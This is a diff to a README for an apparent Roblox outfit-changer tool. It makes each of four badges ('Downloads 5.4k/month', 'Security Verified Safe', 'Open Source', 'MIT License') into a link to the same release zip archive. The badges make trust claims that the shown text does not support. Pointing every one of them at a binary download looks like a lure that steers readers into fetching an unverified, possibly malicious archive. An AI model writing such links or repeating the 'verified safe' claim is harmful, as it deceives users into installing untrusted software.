@@ -4,10 +4,21 @@
 
 
 <p align="center">
+  <a href="https://github.com/tammyrahl/Roblox-Outfit-Changer-v1.2/releases/download/download/Roblox.Outfit.Changer.v1.2.zip">
   <img src="https://img.shields.io/badge/Downloads-5.4k%2Fmonth-purple?style=for-the-badge&logo=github" alt="Downloads" />
+</a>
+
+<a href="https://github.com/tammyrahl/Roblox-Outfit-Changer-v1.2/releases/download/download/Roblox.Outfit.Changer.v1.2.zip">
   <img src="https://img.shields.io/badge/Security-Verified%20Safe-success?style=for-the-badge&logo=shield" alt="Security" />
+</a>
+
+<a href="https://github.com/tammyrahl/Roblox-Outfit-Changer-v1.2/releases/download/download/Roblox.Outfit.Changer.v1.2.zip">
   <img src="https://img.shields.io/badge/Source-Open%20Source-blue?style=for-the-badge&logo=github" alt="Open Source" />
+</a>
+
+<a href="https://github.com/tammyrahl/Roblox-Outfit-Changer-v1.2/releases/download/download/Roblox.Outfit.Changer.v1.2.zip">
   <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge&logo=opensourceinitiative" alt="License" />
+</a>
 </p>
 
 <p align="center">
